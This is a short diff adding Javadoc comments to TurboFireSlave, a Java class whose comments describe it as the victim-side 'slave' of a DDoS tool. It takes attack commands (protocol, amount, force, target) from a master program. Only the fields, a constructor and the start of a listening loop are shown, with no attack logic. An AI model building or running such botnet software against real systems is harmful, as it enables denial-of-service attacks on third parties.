@@ -31,18 +31,46 @@ import java.net.Socket;
 /**
  * @author Lucas Fonseca dos Santos
  * @author Otavio Andrade
+ * @version 1.0
+ * 
+ * This class is the turbo fire slave executable version
+ * of DDOS attack operation. It works into victim machine
+ * executing a malicus command received by master turbo fire
+ * executable version. The command receveid by this version
+ * is a DDOS command with protocol, amount, force and target
+ * system that will be attacked.
  */
 public class TurboFireSlave implements Serializable {
 
+    /**
+     * The serial version of this object into JVM.
+     */
     private static final long serialVersionUID = 1L;
+
+    /**
+     * A gui text interface.
+     */
     private GUI gui;
+
+    /**
+     * Attack pattern mode with all DDOS settings.
+     */
     private AttackPattern attackPattern;
 
+    /**
+     * The turbo fire slave version executable
+     * constructor. It sets the gui instance and
+     * start slave operation.
+     */
     public TurboFireSlave() {
         this.gui = new GUI();
         startSlave();
     }
 
+    /**
+     * This method executs a slave turbo fire version and receives a malicius command
+     * of master turbo fire version.
+     */
     public void startSlave() {
         while(true) {
             try {
